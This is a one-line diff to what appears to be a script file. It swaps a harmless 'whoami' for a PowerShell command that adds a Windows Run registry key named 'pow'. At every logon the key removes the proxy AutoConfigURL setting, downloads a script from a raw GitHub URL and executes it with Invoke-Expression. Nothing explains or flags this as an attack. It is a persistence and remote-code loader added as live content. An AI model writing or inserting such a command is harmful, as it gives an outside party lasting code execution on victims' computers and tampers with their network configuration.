@@ -1,1 +1,2 @@
-whoami
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "pow" -Value "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -Command `"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name AutoConfigURL; Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/highsockswag/yup/main/who.txt').Content`""
+
